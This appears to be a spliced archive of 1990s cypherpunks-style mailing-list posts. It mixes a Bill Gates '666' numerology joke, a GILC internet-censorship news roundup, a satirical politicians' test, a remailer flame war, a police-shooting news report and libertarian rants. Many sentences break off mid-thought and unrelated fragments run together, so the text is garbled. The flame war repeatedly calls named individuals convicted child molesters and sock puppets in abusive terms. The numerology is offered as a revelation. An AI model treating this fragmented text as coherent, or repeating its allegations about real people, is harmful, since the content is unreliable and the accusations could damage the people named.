anyone has insight, let him calculate the number of the beast, for it
is man's number. His number is 666 ."    ....Revelation 13:16-18
Something for you to think about.

The Bible, in the Book of Revelation says that without the sign of the
beast one would not be able to buy, sell, do business

My question to you now is this..... Is Internet now a necessity in
doing business?  The Internet also bears the sign....
Note that the Internet is also commonly known as the World Wide Web or WWW..
One other way we write W is V/   (VI), so .....

This gives me something to ponder upon ... Isn't everything going
towards the Internet? (i.e., buying / selling goods, business
transactions) Isn't Microsoft always on the move to have a monopoly
when it comes to software technology? And now the Internet?
Revelation also says that the mark of the beast will be carried on
one's Hand and one's forehead.....If the Internet would indeed be the

is the Devil:
The real name of "the" Bill Gates is William Henry Gates
III. Nowadays, he is known as Bill Gates (III), where III means the
order of third (3rd).
By converting the letters of his current name to the ASCII-values and
adding his (III),you get the following:
      B  66
      I  73
      L  76
      L  76
      G  71
      A  65
      T  84
      E  69
      S  83
      I   1
      I   1
      I   1
  ---------------
        666 !!!!        THE NUMBER OF THE BEAST.......
Some might think ask, "How did Bill Gates get so powerful?"
Coincidence?  Or just the beginning of mankind's ultimate and total
Before you decide, consider the following:
      MS-DOS 6.21
 77+83+45+68+79+83+32+54+46+50+49 = 666
      WINDOWS95
 87+73+78+68+79+87+83+57+53+1= 666
Coincidence?  You decide...."To agree or to not agree with the WWW or
the Beast", is not the question.  What if the WWW is the 666? Or Bill
Gates be the Beast?
What will you do?? Cancel subscriptions to the Internet?  Resign from
Microsoft? Set out a campaign against Bill Gates in the Internet? Shut
down all Windows95 forever?  It will not do you any good.....
Think about all this and pray, pray really hard, or
else......... Never Stop Believing....

An in-depth investigation by the NSA has confirmed, beyond a shadow of
a doubt, that the dark-conspiracy manifestos that make up 'The True
Story of the InterNet' series, as well as all peripheral communications
from various CoE members, has been nothing more than a clever ruse to
subversively slip the concept quoted above into the minds of the
unsuspecting schills of the Author.
Please be advised that individuals who allow themselves to be influenced
by the subversive concept expressed above run the risk of mistakenly
acting under the assumption that 'infinity' can be defined by the

the programmed reality of those in authority over them exercises in
order to protect them from the madness which can result from attempting
to cross the boundaries of thought and action which have long since
been proven statistically safe to transverse, according to recent CNN
polls designed to ensure that we all remain safely within the pens
within which airport security personnel and tax officials are acting

Truthmonger occassionally takes time out from being a loudmouthed pain

whether it involves a Pepsi logo or a political logo.
A person could make an equally ridiculous and equally valid point by
suggesting the expulsion of black students for not showing up to
school in whiteface during events sponsored by the Aryan Nations.
Unfortunately the school officials involved feel justified in excusing
their repression of civil rights and liberties by downplaying the
specifics of the compromise of freedom they demanded of their students
in return for corporate funding.
Like gun-control and GAK proponents they are asking for only a "small
compromise" as an ante into a game which will eventually result in
the players with the largest pockets naming the game.
Even the most outrageous of silly conspiracy theory posts to the list
failed to predict the advent of mandatory-voluntary Coke T-shirts in

[A1] GILC to Issue Statement on Internet Content and Conduct
Preparing for an OECD one day meeting on "International Co-operation
Concerning Content and Conduct on the Internet", 25th March 1998, in
Paris, members of the Global Internet Liberty Campaign will soon issue
"Content and Conduct on the Internet: The Impact of Self-Regulation
and Filtering on Human Rights to Freedom of Expression."  Among other
things, the statement notes: "Global rating or labeling systems
squelch the free flow of information: Efforts to force all Internet
speech to be labeled or rated according to a single classification
system distorts the fundamental cultural diversity of the Internet and
will lead to domination of one set of political or moral viewpoints.
Such systems will either be easy to use and not have enough categories
for all cultures or it will have so many categories to cater for all
cultures that it will be unusable. These systems are antithetical to
the Internet and should be rejected."
A full report on the OECD meeting and GILCï¿½s presentation will appear
in the next Alert.
[B] ROUNDUP OF GLOBAL INTERNET ISSUES
[B1] Africa
[B1.1] Sudan's Muslim Sects Want Internet Ban
Islamic clerics, in recent calls, have focused their ire on Sudan's
single Internet Service Provider, Sudanet.  Inter Press Service quotes
Mohamed Salih Hassan, a cleric of the influential Ansar Muslim sect,
who sees the Internet as "pollutive" and fears that Sudanese youth are
in jeopardy: "The Muslim people should respect the faith, and not
allow such information to reach their families.  If an uncontrollable
system like the Internet is introduced in society it will be very
difficult for us to preach the Kingdom of Allah."  The battle to ban
the Internet will be difficult, however.  The newspaper interviewed
people already connected to the Internet; one, who used an alias
because he feared repercussions, said: "The Internet is not against
anybody. It is a new information system that feeds the world with
information . . . . The Internet will bring peace to all of us.  It
makes me feel like I am living in a world without borders."
[B1.2] Ghana Brings Internet to People
While most people in Ghana do not have access to their own computers
(because of the combined problems of illiteracy, poverty and weak
electrical supplies), they will soon have access to the Internet.
Several Internet Service Providers are looking for ways to bring the
Internet to the average Ghanaian, through channels that people are
already familiar with: communication centers that offer secretarial,
word-processing, telephone and fax services.  Inter Press Service
reports "Africa Online will create a domain for each of the
participating communications centers. The center, in turn, will be
free to create E-mail addresses for its customers, who can then send
and receive messages from their address at fixed costs."  ISPs are
also looking to provide access to school children.  Network Computer
Systems, another ISP, has recently offered to provide free Internet
connections for a year to 100 high schools around the country.
Visit the Network Computer Systems homepage: Visit Africa Online: [B2] Asia/Oceania
[B2.1] Singapore Requires ISPs to Install Internet Filters
Singapore, which already censors the Internet, books and movies will
require its Internet Service Providers to install, at the server
level, software that filters "inappropriate material."  Reuters quoted
Information and Arts Minister George Yeo's address to parliament where
he said that a software package, like Netnanny was "in the interest of
cleaner, more sanitized internet service."  A few days after that
speech, Bill Gates said, during a one-day trip to the country: "I have
no doubt Singapore, given it is a forward-looking country . . . will
avoid doing something that will be a major roadblock."
Read [B2.2] Malaysia Warns Against Technology Without Morality
With Internet cafes springing up in suburbs all over Malaysia,
students are beginning to send E-mail, chat in chat rooms, and
eventually view sexually explicit material.  To officials in the
predominantly Moslem country, this presents problems.  The nation's
censors already take pains to keep movies free from "sex scenes" and
magazines bare-breastless. The Associated Press quotes Junid Megat
Ayob, Consumer Affairs Minister, who wants stricter controls on the
Internet because he sees his mission as keeping youth from "poisoning
their minds with filth."  To aid in his mission, Cybercafes must now
post with authorities about US$5,100 to ensure that their computers
remain free from pornography.  If the Cafes allow access to sexually
explicit material, the government would confiscate the money.
Read [B2.3] Hong Kong Labels Candy Site "Objectionable"
In another attempt to block "objectionable material" from the
Internet, Hong Kong has censored a Hershey's candy Web site. The
Television and Licensing Authority (TLA) put the "Smarties" candy site
on a list of 1,000 sites which it deemed unfit for children.  CNET
quoted Raymond Yip, of TLA: "We need to investigate the case.  It is
probably a typing error on our part."

[B2.4] Australia Concerned Over US Domain Name Proposals
The United States has recently proposed a centralized plan to regulate
Internet issues.  Besides changing the way persons register Internet
Domain Names, a US-based corporation would administer the names and
subject any disputes to US law. Fears are that the plan would
"effectively ensure US jurisdiction over trademark issues and dispute
resolution processes," said Senator Richard Alson, the Minister for
Communications, the Information Economy and the Arts, in a press
release. He added: "We need to ensure that the views of Australian
stake holders, and the Australian Government, are fully considered in
decisions to reform the international system."

[B3] Europe
[B3.1] EU Critiques US Over Domain Name "Green Paper"
The battle against the US Domain Name proposals is also being waged on
European soil.   The European Commission has accused the US of
desiring to keep the international network of computers under domestic
control, and thereby, creating a monopoly.  The European Report
announced that "the EU and its Member States are calling for a
re-balancing of interest and responsibilities in recognition of the
Internet's international character."  They want balanced and fair
participation by the private sector in Internet management. In a
"green paper" published in January, the US suggested that the private
sector begin controlling essential pieces of the system, instead of
the US government.  The "essential pieces" are "generic top-level
domains": for example, ".net," ".org," and ".com."  The Deutsche
Presse-Agentur quotes Professor of Computer Science, Werner Zorn of
the University of Karlsruhe in Germany: "The U.S. government is trying
to prevent foreign dominance on the Internet." Another motive, adds
Zorn, is retaining a lucrative source of income.  Today, US-based
Network Solutions charges $100 per domain name registered.

[B3.2] Russia Considers Amendment to Protect Internet From New "Mass
Media" Law
The Moscow Times reported that the Russian Duma has recently proposed
a new law on "mass media that could place a roadblock in the path of
Russia's fledgling web publishers, from individuals with personal home
pages to large corporations blazing the trails of electronic
commerce."  Duma deputy, Y.M. Nesterov, however, suggested an
amendment excluding any mention of "computer information" from the
bill.  Furthermore, the chair of the committee preparing the bill,
displayed some interest in the Internet question.  The Communication
Committee will examine that and other amendments to the "mass media"
bill and draft a second bill for final hearing.  As of yet, nothing
has been announced.
Latest information in Russian:
[B3.3] Kosovo Atrocities Posted to Internet
In the remote parts of Yugoslavia, unreliable links to the outside
world and the tight-lipped state news agency, Tanjug, have made a
journalist's job difficult. But in many situations, the Internet
continues to provide detailed and timely reports.  The Scotsman
reports that Web sites publish, without the "benefit" of censorship,
and post eyewitness accounts and pictures of "men, women, and children
with eyes gouged out, throats cut, and grenade and gunshot wounds."
The Internet accounts guarantee that traditional sources of
information will not dictate the spread of complete and accurate
information; therefore, "there can be no doubt whatsoever of the
veracity of claims made by Albanians in Kosovo."

[B3.4] UK Called on EU Members to Allow Police to "Tap" Encrypted
Following the GILC statement on encryption, European Voice reported
that officials from the UK desire that, in particular situations,
government officials should be authorized to tap encrypted E-mail
messages sent through the Internet.  Citing concerns with terrorists,
the Mafia, and other criminal organizations, UK officials warned:
"Where an encryption key is used for confidentiality purposes, it may
be necessary for law enforcement agencies to have lawful access . . .
.. either overt[ly] or covert[ly]."  For an opposing view, European
Voice quoted the Business Software Alliance: "Without strong
encryption, businesses and individuals will not entrust their valuable
proprietary information, creative content, and sensitive information
to electronic networks. The result will be that the full potential for
electronic commerce, personal growth and government efficiency and
other benefits of the information society will be delayed or lost
altogether." According to Yaman Akdeniz of Cyber-Rights &
Cyber-Liberties (UK) the current UK policy is still not clear: "We
will have to wait and see the new policy; and I, unfortunately,
believe that it will still be a system which favors key escrow."

[B4.1] Senate Approves Two Internet Bills
The Senate Commerce Committee approved on a voice vote two bills that
restrict speech on the Internet.  The first was Senator John McCain's
(which would limit student access to constitutionally protected speech
in schools and libraries) and the other was Senator Dan Coats's (which
would censor legitimate adult speech).  McCain's bill requires schools
and libraries, which receive federal subsidies for Internet
connections, to install filtering software.  Senator Conrad Burns,
however, offered an amendment that would not require the use of
filtering software, but would require that schools have some kind of
Internet policy which shields students from sexually explicit
material.  Senator Coats's bill would censor commercial distribution
of "harmful material" to people under 17 years of age.  Senator Dan
Wyden, the sole dissenter on the Coats bill, criticized Coats's
attempt as a "one size fits all" model.

investigations and put children in danger: "We would encourage the
Internet provider industry to maintain subscriber and call
information.  We certainly hope it would be done, even on a voluntary
basis." Freeh added: "Uncrackable encryption allows, and will continue
to allow with increasing regularity, drug lords, terrorists, and even

The FBI has had a long history of arguing against strong encryption.
Nevertheless, on March 17th, a Justice Department official, Robert
Litt, the deputy assistant attorney general of the criminal division,
remarked to a Senate Judiciary subcommittee hearing on the
constitutional issues raised by government encryption controls: "We
are not looking for any mandatory controls domestically at this time."
The CyberTimes reported that, for now, he/the FBI/the Clinton
administration is "retreating from legislation that would give 'law
enforcers access to encrypted computer data and communications.'"

The Electronic Frontier Foundation will challenge New Mexico's "Net
Indecency Law."  Earlier this month, Governor Gary Johnson signed a
bill that suffers from the same constitutional defects that caused the
Supreme Court to strike down the Federal Communications Decency Act in
June of 1997.  In a letter to Johnson, Barry Steinhardt, president of
EFF (a GILC founding member) wrote, "the bill is patently
unconstitutional and represents a threat to freedom of expression, not

Reno v. ACLU: [B4.5] 100 Companies Join to Fight Encryption Controls
Americans for Computer Privacy (ACP) has begun an advertisement
campaign urging citizens to stop their politicians from limiting
encryption.  In a press release, ACP stated that it "will implement a
multi-million dollar campaign to demonstrate to members of Congress
and administration officials that a fair encryption policy is not just
a computer issue.  It's a privacy issue.  It's a consumer issue. It's
a medical records issue.  It's a taxpayer protection issue.  It's a
crime deterrent issue.  It's a jobs issue.  It's a competitive issue.
In an open letter, the American Civil Liberties Union, the Electronic
Frontier Foundation and the Electronic Privacy Information Center
said, ï¿½(W)e believe that the ACP will be an important ally in the
ongoing effort to protect personal privacy in the digital age," the
letter says, "and we look forward to working together towards a
complete and unrestricted repeal of the current controls on the export

use of encryption."

@_subject: Political Test 
THE SACREDBULL BASIC ENGLISH AND MATH TEST FOR FEDERAL POLITICIANS
SECTION I: Competency in English
1. The phrase, "Congress shall make no law..." means
a. Congress shall make no law...
b. Congress shall make some laws...
c. Americans can do anything they want, except things my colleagues and I,
or our largest contributors, personally dislike.
d. Congress can do anything it damn well pleases, starting with stacking the
courts with our toadies.
2. What is the correct interpretation of the phrase "...the right of the
people...shall not be infringed"?
a. The right of the people...shall not be infringed.
b. The right of the people...shall be infringed, but only gradually,
moderately and for the good of children and battered women (except the ones
we batter).
c. The right of the people is actually a state's right and the states are a
bunch of wusses who'll put up with anything as long as we offer them enough
tax-funded loot in return for selling out their citizens.
d. The people are all sitting on their butts watching TV, so we can infringe
any damn thing we feel like infringing, and we'll get the media to screw you
if you think otherwise.
3. What is the meaning of the phrase, "The powers ... are reserved to the
states, or to the people..."
a. The powers...are reserved to the states, or to the people...
b. The interstate commerce clause gives us the authority to do anything.
Therefore there are no other powers left to reserve for those other twits.
Too bad for them.
c. Where'd you get a stupid idea like that? We're more powerful and have
bigger guns than they do, and that's all that really matters, isn't it?
d. Hahahahahahahahahaha!
4. Essay Question: Write a bill (a proposed law, you twit) in plain English,
for once. We just want to see if you can do it. Extra credit if it's
constitutional or can be read and understood in less than ten minutes by a
high school student of average intelligence.
SECTION II: Competency in Mathematics
1. A fugitive oil baron named Roger gives $300,000 to the Democratic
National Committee for the specific purpose of gaining "access" to the
president. For that, he is given six invitations to the White House, but
does not get the pipeline he wanted. How much money should Roger give to the
DNC next time?
a. Nothing. People shouldn't be able to bribe their way into the presence of
public officials.
b. This is a trick question. Next time, a Republican president might be in
office, and Roger should give his money to the RNC, instead.
c. I know the president. If Roger gives me the money, I'll give Roger
access. Heck, I'll even throw in some hot babes, since Roger said the babes
at the White House were too busy stroking Clinton to pay any attention to
d. $600,000. (Roger's answer, in testimony before Congress 9/18/97.)
2. According to the administration's own projections, Americans will soon
face an 82 percent income tax rate if present entitlement programs and
levels of federal growth persist. How many years before American citizens
rise up in rebellion?
a. Americans should never be driven to that kind of desperation. We should
immediately begin rolling the federal government back to constitutional
b. Don't worry, we're going to reform the tax system and, as Rep. Mitch
McConnell says, "virtually abolish the IRS as we know it"; we'll just have
an 82 percent national sales tax, instead.
c. As soon as my term in office is over and I can get an oceanside place in
Costa Rica, complete with Uzi-toting bodyguards.
d. What do we care? We'll just let Janet burn the little jerks and claim
they committed suicide.
3. The federal budget is...oh...some great big figure in the gazillions. The
national debt is probably about five trillion dollars, give or take. The
annual deficit is, you know, billions and billions and billions (not
counting off-budget stuff like Amtrak and the Post Office). Budgets for
Social Security and Medicare are increasing at some really wowie-zow of a
percent every year. (Not like you care what the actual figures are, anyway.)
Congress and the president have just cooked up a tax cut package filled with
goodies for favored special interests. Please explain how you can claim the
budget will be balanced by 2002.
a. We can't do it without extreme cutbacks in government. Anybody who says
we can is lying like a congressman.
b. Revenues will...uh...yeah...revenues will increase because of all those
tax breaks and...uh...the economy will be just perfect forever and ever
and...uh...maybe some plague or something will come along and kill off all
those money-sucking old folks...or something like that, maybe.
c. The media said it's true, didn't they? What more proof do you want?
d. Hey, that's for the suckers who are here in 2002 to figure out. I'll be
in Costa Rica by then.
e. Well, actually, now that I think about it, I'll be in some other country
with an army so they can fight off the U.S. troops who will be sent to take
my loot like they did Noriega's. Like, hey, I stole mine fair and square!
Correct answers: B, C, D and E (From the politicians' point of view, that
is. Hey, you know, whatever we can get away with while the folks are
watching TV...)
Correct answer, in reality: L-E-A-D T-H-E-R-A-P-Y

I make a point of checking the individuals and companies involved in
various enterprises claiming to be the paranoid's best friend, as well
as checking their links and assorted tentacles.
The first thing I noticed about veil's anonymity site was that they don't
seem very proud of who they are and their company's background, since
they don't provide any information of that nature.
Combining that fact with the fact that they seem to be giving out blatantly false information regarding the anonymity of their users,
I would assume that their purpose is far from what they claim.

wmcclatc at primenet.com (William J. McClatchie)
And your legal basis for calling the posting of public information from a
public website to usenet "illegal usage" is ???  Presumably if the state
had wanted to keep the info secret, they wouldn't have made it public
The only whining I've seen has been by Gary Burnore who complained that the
state of North Carolina failed to keep his conviction as a sex offender a
secret, and by various DataBasix sock puppets and groupies.
Burnore did the crime, he was convicted, he registered as a sex offender
with the state of NC, the information was made publicly available by the
state, and people found out as they were intended to.  Deal with it!
Maybe you ought to learn a little about remailers before you make such
ridiculous claims, McClatchie.  If I'm the person you say "whined", then
I'm *NOT* the same person who posted the information that Gary whined
about.  Sorry to burst Gary's bubble that all posts which poor little Gary
Burnore doesn't like originate from his one mythical "Anon Asshole ".
In fact, the information is just as likely to have been posted anonymously
by YOU as by me.
Let me get this straight...  Someone threatens a remailer user with
physical violence, I comment on it, and now I'm "abusing a remailer" just
because you don't like what I have to say?  Don't you think that's for the
remailer operator to decide?  Do you operate a remailer, McClatchie?

"Anonymous stalker"?  For merely posting a reply to a public post on
Usenet?  What state or country has a statute against that, and what makes
you think the poster falls under its jurisdiction if it does exist?  As for
whether a certain post is "propaganda", that is for the reader to decide,
especially when of the content is independently verifiable.  The
"propaganda" you refer to was apparently intended to refute the fallacious
assertion that since Gary Lee Burnore's entry in the North Carolina
official database of registered sex offenders had apparently been removed,
then the underlying crime for which he was convicted and required to
register somehow automagically never happened.  To make such an assertion
is to invite rebuttal.
The thread you're whining about involved Steve Crisp threatening an anonymous poster with "beating the living fuck out of you"
if his/her identity could be determined, a second anonymous poster
challenging the propriety of such a threat, and yet another DataBasix
groupie, William McClatchie , calling the second
anonymous poster a "remailer abuser" for daring to make such a challenge.
So rather than denouncing the threat itself, you choose to call the person
challenging it an "anonymous stalker"?  If you feel no need to "hide"
anything, please feel free to post your street address and home phone
number.  But I imagine that many people with small children would not want
their names, from which their street address can be derived by someone with
the resources available to you and Gary Burnore, to fall into the hands of
a convicted child molester with a history of abusive retaliation.
Being threatened with physical violence for making an unpopular post is
one of the best arguments available as to why anonymity is necessary when
people like Steve Crisp and convicted child molester Gary Lee Burnore are
running around loose making those threats.
This, of course, comes from the same Belinda Bryan who impersonated a
lawyer for DataBasix to demand the disclosure of (fortunately non-existant)
user logs from the Huge Cajones remailer in a failed Scientology-esque
attempt to embarass its users.  And that attack, BTW, started because Gary
Burnore was pissed that an anonymous whistle blower used a remailer to tip
of his victim's mother to the molestation.  As is typical of his style,
Burnore denounced that legitimate use of anonymity as "harassment" and
"abuse".  It was also Burnore who chose to make PUBLIC what had previously been a
private e-mail, thus inviting his critics to factually evaluate the claims.
One of them apparently did so and discovered Gary Burnore's name and mug
shot were published on an official PUBLIC website of registered sex
offenders maintained by the state of North Carolina where Burnore moved
after leaving San Francisco.  Perhaps he should have learned a lesson from
Gary Hart and not have taunted the wrong people to find evidence of his
Will the continual harangue against privacy and anonymity by Gary Lee
Burnore, Belinda Bryan, Billy McClatchie, and other staffers and sock
puppets of the DataBasix wrecking crew never end?
BTW, Belinda, cross-posting your whining drivel in the fashion you're
threatening negates your lame attempts to achieve deniability by using the
infamous X-No-Archive header that has become the trademark of DataBasix'
denizens.  IOW, you won't be able to retroactively claim that an
embarassing post from you was "forged" because it's not archived at an
unbiased, third party site.  Can you say "oops"?

Perhaps you ought to reread your own header line, if you don't like what is

to avoid retaliation for hypersensitive netcops like you, Gary Burnore, and
Steve Crisp.
If everyone posted strictly politically correct content that wouldn't offend
anyone, there would be little need for anonymity.  But threatening to
"beat the living fuck out of" someone because he disagreed with what someone
posted is ample reason to withhold one's name and e-mail address.

@_subject: Non-anonymous remailers 
Recently a new technology has been proposed: non-anonymous remailers.
A non-anonymous remailer separates the two traditional functions of the
remailer network: anonymity and avoiding traffic analysis.  Because the
network provides both of these features, some people may not be aware
that they are distinct.
Anonymity means that no one can tell who sent a message.  Neither the
recipient, the remailers, or an eavesdropper can know the source of
a message.
Avoiding traffic analysis means making it impossible for the path a
message takes through the network to be traced, either by the remailers
or by third parties.
A non-anonymous remailer avoids traffic analysis but does not provide
anonymity.  The recipient can tell who the sender of a message is,
but no one else can, neither the remailers nor eavesdroppers.
There are several ways to achieve this cryptographically.  The general
idea is that the sender of the message must sign it with a valid public
key (one signed by a CA trusted by the remailer network).  This signature
is hidden from everyone but the recipient because the message is encrypted
for the recipient.  However the sender can use variants of zero knowledge
proofs to demonstrate that inside the encryption there is a signature
which satisfies the requirements.
The remailer net will only deliver a message to an end user if it is able
to verify that the message, when decrypted, will be properly signed.
This assures that the end user will be able to determine who sent the
message, while no one else will.
Non-anonymous remailers would be suitable for cases where people do
not want eavesdroppers to know with whom they are communicating, but
where they don't need to be anonymous to their communication partners.
A financial house's merger and acquisitions department, for example,
would not want third parties to know with whom they are exchanging
email.  A surveillance target will want to hide the identities of his
co-conspirators.  An employee who is considering changing jobs will
not want his employer to know that he is sending email to a competitor.
Many similar examples exist.
Non-anonymous remailers would also have the advantage that they would be
much less prone to abuse than anonymous remailers.  Sending a harrassing
message or commercial spam through a non-anonymous remailer would be
pointless.  It might as well have been sent directly, since the remailer
does not hide the sender's identity from the recipient.
In summary, non-anonymous remailers prevent traffic analysis without
providing anonymity.  This more limited functionality renders the remailer
less vulnerable to abuse and misuse, while providing protection which
will be adequate for many situations, and which may be especially
appropriate for the business environment.

PGP 5.x appears to have no advantages over 2.6x, but when Windoze
users began to "upgrade" to it, we had to rewrite our mailing list

Its other primary features -- public keys the size of Mack trucks,
dog-slow decryption rates, and more complicated key management --
hardly count as advantages.
So what's 6.0 got?  Total incompatibility with previous versions?
10 MB executables?  An additional bloatware serving "on the side"?

24 shots came from 1 officer in Oregon case
Policeman fired until gun empty, then reloaded and kept firing
By BOB SABLATURA
Copyright 1998 Houston Chronicle
One of the officers nobilled in the death of Pedro Oregon Navarro fired his semiautomatic pistol at the 22-year-old man until the
magazine was empty, then reloaded and continued firing. In all, Officer David R. Barrera fired 24 of the 33 shots discharged in Oregon's southwest Houston apartment July 12, according to
sources familiar with the investigation. Assistant District Attorney Ed Porter confirmed that Barrera fired most of the shots. While the medical examiner's office could not
determine the exact caliber of the bullets that made the 12 wounds in Oregon's body, Porter said, three of the four bullets recovered
from the body were fired from Barrera's weapon. Porter, who was present on the scene a few hours after the shooting -- and reconstructed it during a walk-through with the officers
involved -- suggested that the bullets that struck Oregon may have been some of the last shots that the officers fired. "I strongly suspect that was the case," Porter said. Richard Mithoff, an attorney representing Oregon's family, said it is "incomprehensible" that one of the officers paused to reload his
weapon. "They had no grounds to be in the apartment, and no grounds to open fire," Mithoff said. "And if this is true, there certainly was no
grounds to reload and execute this guy lying on the ground." Aaron Ruby, a member of the Justice for Pedro Oregon Coalition, said Barrera's actions could only be termed "homicidal and
premeditated," and probably explain the numerous bullet holes in Oregon's back. "If that fact was known to the grand jury, it makes their actions all the more outrageous," Ruby said. "I believe the people of Houston
will be stunned when they learn of this." Harris County District Attorney John B. Holmes Jr. said state law allows police officers to use deadly force if they believe it
necessary for self-defense and can continue shooting "so long as they reasonably perceive" the threat continues. "An analogy I use is that if it is OK to kill a guy dead, it is OK to kill him dead, dead, dead," Holmes said. Holmes said it is also not uncommon for a police officer involved in a shooting to have no idea how many shots he fired. Barrera, a five-year veteran of the Houston Police Department, was armed with a 9 mm Sig-Sauer semi-automatic pistol loaded with
nylon-coated bullets. According to the Police Department, after illegally entering Oregon's apartment with fellow members of the HPD gang task force in
an unsuccessful search for drugs, Barrera and several other officers chased Oregon to his bedroom and kicked in the locked door.
During the pursuit, Barrera's pistol discharged, striking one of his partners in the shoulder. The officers said they believed they were being shot at, and two officers joined Barrera in firing at Oregon. Barrera emptied his pistol, paused to reload a new magazine, and resumed firing, according to prosecutors. Investigators later determined that Barrera fired a total of 24 rounds. Barrera's weapon was originally loaded with a standard 16-round magazine, which held at least 14 rounds. He reloaded with an
extended magazine holding even more rounds. The second magazine was not emptied, according to sources. Officers David R. Perkins and Pete A. Herrada fired a total of nine rounds between them. Both officers were armed with similar
.40-caliber handguns. Perkins carried a Sig-Sauer Model 40 and Herrada was armed with a Glock Model 23. Prosecutors said only about 10 seconds elapsed from the time the shooting began to the time it ended. Semi-automatic pistols typically are double-action on the first shot, meaning that pulling the trigger draws the hammer back --
cocking it -- and then releases it. After the first shot, the hammer remains in a cocked position so less trigger-tension is required to fire the weapon, making it fire
quicker. The officer can also aim the gun more accurately because it takes less movement of the trigger to discharge shots. Oregon's body was hit 12 times, nine times in the back, once in the back of the shoulder, and once in the back of his left hand. In
addition, one shot entered the top of his head, exiting above the right ear. At least nine shots entered his body at a downward angle, suggesting he was shot while face-down on the floor. Four bullets were
recovered from Oregon's body, and numerous bullet fragments were found underneath the carpet beneath the body. The body was face-down, with his head toward the doorway through which the police officers were firing. Attorneys for the Oregon family dispute the police officers' version of events, and say Oregon was not in the front of the apartment
when police illegally barged in. "It is my understanding that he was in the bedroom," Mithoff said. They also contend that some of the officers' shots were fired through the bedroom wall, indicating they were blindly firing into the
room. Porter said he has examined numerous crime scenes involving police shootings during his career and is amazed just how often shots
fired by police officers miss their mark. "Most people think an officer fires a weapon and someone gets shot," Porter said. "Often that is just not the case." Holmes said the grand jury heard evidence regarding all the shots fired, the trajectory of the bullets, the position of the officers and
the medical examiner's reports regarding wounds to Oregon's body. "The specific number of times and the path of the projectiles was known to the grand jury," Holmes said. After hearing all the evidence, a grand jury cleared five of the six officers -- including Barrera -- of all charges. One officer was
charged with a misdemeanor offense of criminal trespass. Earlier this week, all six officers were fired by Chief C.O. Bradford for violating the law and ignoring department procedures. Barrera's attorney did not respond to a request for an interview. Rick Dovalina, national president of LULAC, said he is especially concerned that HPD Internal Affairs found the officers had
violated the law in conducting the raid, but the grand jury had brought no charges. He renewed his call for Holmes to try to bring charges against the officers. "They are both supposed to be looking at the same evidence," Dovalina said. "Johnny Holmes needs to do the right thing and present
the case to another grand jury." Posted for the entertainment of those that chide Tim for being armed to the teeth.

  > Which is completely correct...
Perhaps I missed the part of Visual Basic that was supposed to be
"incredibly" less "primitive" than GCC and PERL.
Unfortunately, I have to actually *use* VB5 for my employer (who will
remain nameless, other than to say that they're one of the world's
largest electronics manufacturers, and firmly in bed with Micro$oft).
So far as I have been able to discern, its only advantage is the
ability to prototype screens quickly.  When it comes to actually
*debugging*, any reasonably large program causes enough system crashes
that you've got to try to build mini test environments to test out
individual pieces.  (Yup, it's exactly as good a programming
environment as M$ Word is a desktop publishing environment.)
Sure, GCC is just a compiler.  But my combination of GCC, DDD, and
XEmacs provide a development environment that is more powerful than
any of Microsoft's products, as easy to use, and is just as "mouse-
friendly".  (Hell, I use GCC instead of VC for NT code, too.)
Maybe I've been out of the "novice" stage for too long to understand
the attraction of VB.  But the other hardware engineers (certainly
novice programmers) in this group won't touch it except at gunpoint
either.  But its use -- like that of NT itself -- has been mandated
from above by beancounters and IT managers.

However, who holds out hope that such a sensible

[1] The plop is a useful measure of human cogitation. As every small child
knows, much good thinking is done whilst enthroned on the commode, since the evacuation of feces from the anus promotes the introduction of fresh material into the brain through the ears.  After years of experimentation
and careful measurement, we (the ISO labs) have observed a strong  correlation
between ideas and fecal bombardment of the receptive commodal pool and audible
emissions therefrom. For example, it required only 0.3 plops to decide to vote
for Clinton while a similar decision in favor of John Major required almost 5 plops.
For the purposes of comparison, 10^6 homosapiens plop = 1 horseplop. While the

All identifiable concentration nodes (news, ftp & http servers,
remailers, dial-in access points etc.) will eventually be censored. It
is interesting to note that today's network topology is more vulnerable
to censorship than UUCP was.
The only (partial) solution is to raise the cost of censoring by
requiring one-to-one effort. In other words, serverless world in which
end users directly exchange (preferably encrypted) packets over common
carriers. Hint: *Bsd + IPSec + uucp over IP and then merge in Crowds
technology where real-time relaying is needed.

State is not "created" or "set up". This assumes in-born willingness and
desire of subjects to have a state, and that a state becomes because
so-called "people" need it. Or that having a state is somehow natural
order of things.
A state is just an extension of a tribal power structure, or, deeper
into the past, successor to silverback hierarchy. A group of people
(families, clans, etc.) that happen to have power over the rest on some
territory. The centuries long brainwashing to the contrary has
successfully muddled the issue and made it "something complicated and
not for ordinary people to worry about." And a great topic for ranting.
The semantics of this indoctrination are deep in the language. In
newspeak it is impossible to think wrong thoughts. A state is not "run"
by individuals - (that neatly implies that it is something above mere
individuals) - state is just a terrific excuse for individuals for
herding the rest.
"State" is not good or bad, any more that a tree is good or bad. State
is creation of human ability to abstract, and demonstrates
self-limiting attribute of intellect in general. We are capable of
imagining extremely perverse systems for screwing ourselves voluntarily.
Using that to one's personal benefit is as natural as eating. And history
proves that.
The question is, can we really escape newspeak limitations ? Is a new
language required for individuals to exist ? Maybe use of an ancient
tongue that is not polluted with the modern bias ?

`Their plea for food and aid' is just that: a plea; it no more creates
an _obligation_ to help them than my plea for your money to help rebuild my burned-down house should. Still, in an anarcho-capitalistic
system, Mitch would be responded to by private individuals through
charitable aid organizations such as the Red Cross (much as it is now).
Your asking the question implies that you believe we have or should have an obligation to help Mitch's victims; one that justifies the use
of tax money - money that is, in effect, collected at gunpoint from all of us citizen units.
By the way, since you're so fond of quoting the US Constitution, please
show where the document authorizes the Men With Guns to take their
captives'^H^H^H^H^H^Hcitizens' money and give it away to help victims of natural disasters in foreign countries.
(Also consider that Mitch is merely one in a long line of natural
disasters that have been and continue to be inflicted on various
peoples of the world.  Some we hear about and some we don't, based on
the vagaries of the news media's inclinations and their judgement of how interested the American public will be. We don't end up bailing
them all out; only those which one politician or another has decided
will make them look `compassionate'. If an equivalent disaster occurred
in a less favored nation - say, an earthquake in Iran - you can bet that
the US's governmental response would be much less generous.)

This is why I buy insurance.  But let's go with your example: imagine that I didn't buy insurance (because I didn't want to or
couldn't `afford' it or whatever), would I then be entitled to go
around the neighborhood (gun in hand) and demand `charity' from all
my neighbors?
What if my house burns down? Again, can I demand `charity' at gunpoint
from my neighbors?
What if another motorist hits my parked car and totals it? Can I
demand that my neighbors help me buy a new car?
What if a $5 million (or use $5 billion if you prefer) operation would

Can I demand `charity' to pay for the plastic surgery?
The question isn't and shouldn't be about whether you would `accept' charity (after all desperate people will do lots of things they might

ought to be REQUIRED to fund the `charity' you would like to receive.

